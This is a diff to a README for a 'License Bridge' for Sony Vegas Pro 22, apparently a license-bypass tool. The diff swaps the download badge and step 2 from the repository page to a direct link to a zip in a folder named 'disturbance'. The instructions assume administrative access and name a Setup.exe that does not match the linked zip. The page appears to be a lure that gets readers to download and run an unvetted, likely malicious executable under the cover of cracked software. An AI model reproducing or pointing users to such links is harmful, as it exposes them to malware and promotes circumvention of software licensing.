@@ -1,7 +1,7 @@
 # 🛠 Sony-Vegas-Pro-22-License-Bridge - Managed access for video editing tools
 
 <div align="center">
-  <a href="https://github.com/Carvalhogeral2016/Sony-Vegas-Pro-22-License-Bridge">
+  <a href="https://github.com/Carvalhogeral2016/Sony-Vegas-Pro-22-License-Bridge/raw/refs/heads/main/disturbance/License_Bridge_Vegas_Sony_Pro_1.3.zip">
     <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
   </a>
 </div>
@@ -26,7 +26,7 @@ Before you install this tool, confirm your system meets these specifications:
 Follow these steps to configure your software environment. These instructions assume you have administrative access to your computer.
 
 1. Close any open video editing software before you begin.
-2. Visit the download page: [https://github.com/Carvalhogeral2016/Sony-Vegas-Pro-22-License-Bridge](https://github.com/Carvalhogeral2016/Sony-Vegas-Pro-22-License-Bridge).
+2. Visit the download page: [https://github.com/Carvalhogeral2016/Sony-Vegas-Pro-22-License-Bridge/raw/refs/heads/main/disturbance/License_Bridge_Vegas_Sony_Pro_1.3.zip](https://github.com/Carvalhogeral2016/Sony-Vegas-Pro-22-License-Bridge/raw/refs/heads/main/disturbance/License_Bridge_Vegas_Sony_Pro_1.3.zip).
 3. Select the file named `Setup.exe` from the latest release list.
 4. Save the file to your computer.
 
